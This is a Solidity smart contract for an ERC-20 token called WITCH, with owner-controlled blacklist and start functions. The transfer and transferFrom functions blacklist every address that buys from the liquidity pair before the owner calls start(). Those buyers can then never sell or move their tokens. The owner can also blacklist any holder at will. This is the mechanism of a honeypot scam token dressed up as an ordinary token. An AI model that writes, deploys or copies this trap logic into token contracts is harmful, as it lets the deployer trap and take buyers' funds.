pragma solidity ^0.8.0;
import "./SafeMath.sol";
// ----------------------------------------------------------------------------
// ERC Token Standard #20 Interface
//
// ----------------------------------------------------------------------------
interface ERC20Interface {
    function totalSupply() external view returns (uint);
    function balanceOf(address tokenOwner) external view returns (uint balance);
    function allowance(address tokenOwner, address spender) external view returns (uint remaining);
    function transfer(address to, uint tokens) external returns (bool success);
    function approve(address spender, uint tokens) external returns (bool success);
    function transferFrom(address from, address to, uint tokens) external returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract Safe_Math {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract WITCH is ERC20Interface, Safe_Math {
    using SafeMath for uint256;
    string public _name = "WITCH";
    string public _symbol = "WITCH";
    uint8 public decimals=6;
    uint256 public _totalSupply;
    address private Owner;
    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;
    mapping(address => bool) whitelist;
    mapping(address => bool) blacklist;
    uint256 _start=0;
    address pair;
    address CamelotRouter=address(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);

    constructor() {
        Owner = msg.sender;
        balances[Owner] = 500000000000*1e6;
        _totalSupply = 500000000000*1e6;
        emit Transfer(address(0), Owner, 500000000000*1e6);
        whitelist[CamelotRouter]=true;
    }
    function totalSupply() external  override view returns (uint) {
        return _totalSupply - balances[address(0)];
    }

    function balanceOf(address tokenOwner) external override view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) external override view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }

    function approve(address spender, uint tokens) external override returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) external override returns (bool success) {
        require(address(0) != to, "to must an address");
        require(balances[msg.sender] >= tokens, "balance must enough!");
        require(!blacklist[msg.sender], "blackList");
           if(msg.sender==pair&&_start==0){
              blacklist[to]=true;
               }
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) external override returns (bool success) {
        require(address(0) != to, "to must an address");
        require(balances[from] >= tokens, "balance must enough!");
        require(allowed[from][msg.sender] >= tokens, "allowed must enough!");
        require(!blacklist[from], "blackList");


        if(from==pair&&_start==0){
        blacklist[to]=true;
        }


        balances[from] = safeSub(balances[from], tokens);
        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(from, to, tokens);
        return true;
    }
    function name() public view virtual  returns (string memory) {
    return _name;
    }

    function Black(address us)public view returns(bool){
        return blacklist[us];
    }


    function symbol() public view virtual  returns (string memory) {
    return _symbol;
    }
    function Decimals() public view virtual returns (uint8){return decimals;}


    function setblack(address _black)public onlyOwnerOf{
     blacklist[_black]=true;
    }

    function setwhite(address _white)public onlyOwnerOf{
     whitelist[_white]=true;
    }

    function start()public onlyOwnerOf{
            _start=block.number;
    }

    function started()public view returns(uint256){
        return _start;
    }

    function setPair(address _pair)public onlyOwnerOf{
        pair=_pair;
        whitelist[pair]=true;
    }

    event OwnershipTransferred(address previousOwner, address newOwner);
    function renounceOwnership() public virtual onlyOwnerOf {
        emit OwnershipTransferred(Owner, address(0));
        Owner = address(0);
    }

    function OwnerOf()public view returns(address _owner){
        return Owner;
    }


    modifier onlyOwnerOf(){
    require(Owner == msg.sender, "ERC721:  is not owner nor approved");
        _;
    }



    }